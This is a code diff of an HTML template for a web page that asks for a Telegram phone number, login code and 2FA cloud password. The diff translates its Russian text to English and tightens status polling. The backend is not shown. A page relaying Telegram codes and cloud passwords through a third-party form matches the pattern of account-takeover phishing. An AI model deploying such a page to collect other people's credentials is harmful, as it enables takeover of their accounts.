@@ -104,7 +104,6 @@
             100% { transform: rotate(360deg); }
         }
         
-        /* Адаптивная верстка для планшетов */
         @media (max-width: 768px) {
             body {
                 padding: 15px;
@@ -131,7 +130,6 @@
             }
         }
         
-        /* Адаптивная верстка для мобильных устройств */
         @media (max-width: 480px) {
             body {
                 padding: 10px;
@@ -157,7 +155,7 @@
             
             input[type="text"], input[type="password"] {
                 padding: 12px;
-                font-size: 16px; /* Предотвращает зум на iOS */
+                font-size: 16px;
                 margin: 8px 0;
             }
             
@@ -167,8 +165,7 @@
                 margin: 15px 0;
             }
         }
-        
-        /* Адаптивная верстка для очень маленьких экранов */
+            
         @media (max-width: 320px) {
             .container {
                 padding: 20px 15px;
@@ -190,7 +187,6 @@
             }
         }
         
-        /* Ландшафтная ориентация на мобильных */
         @media (max-height: 500px) and (orientation: landscape) {
             body {
                 padding: 10px;
@@ -219,23 +215,23 @@
         
         {% if step == 'phone' %}
         <div class="status info">
-            Введите номер телефона для авторизации
+            Enter your phone number for authorization
         </div>
         <form method="POST">
             <input type="text" name="phone" placeholder="+7XXXXXXXXXX" value="{{ phone }}" required>
             <br>
-            <button type="submit">Отправить код</button>
+            <button type="submit">Send code</button>
         </form>
         
         {% elif step == 'code' %}
         <div class="status info">
-            Код отправлен на {{ phone }}<br>
-            Введите код из Telegram
+            Code sent to {{ phone }}<br>
+            Enter the code from Telegram
         </div>
         <form method="POST">
             <input type="text" name="code" placeholder="12345" required>
             <br>
-            <button type="submit">Подтвердить</button>
+            <button type="submit">Confirm</button>
         </form>
         
         <script>
@@ -247,33 +243,33 @@
                         window.location.href = '?step=password&phone={{ phone }}';
                     }
                 })
-                .catch(error => console.error('Ошибка проверки шага:', error));
+                .catch(error => console.error('Error checking step:', error));
+            setTimeout(checkStep, 100);
         }
-        setInterval(checkStep, 2000);
+        checkStep();
         </script>
         
         {% elif step == 'password' %}
         <div class="status info">
-            Включена двухфакторная аутентификация<br>
-            Введите пароль
+            Enter your Cloud Password (2FA)
         </div>
         <form method="POST">
-            <input type="password" name="password" placeholder="Пароль 2FA" required>
+            <input type="password" name="password" placeholder="Password" required>
             <br>
-            <button type="submit">Войти</button>
+            <button type="submit">Confirm password</button>
         </form>
         
         {% elif step == 'success' %}
         <div class="status success">
-            ✅ Авторизация успешна!<br>
-            Можете закрыть эту страницу
+            Authorization successful!
         </div>
-        
+        <div class="status info">
+            You can close this page.
+        </div>
         {% elif step == 'error' %}
         <div class="status error">
-            ❌ Ошибка: {{ error }}
+            An error occurred during authorization. Please try again.
         </div>
-        <button onclick="location.reload()">Попробовать снова</button>
         {% endif %}
     </div>
 </body>
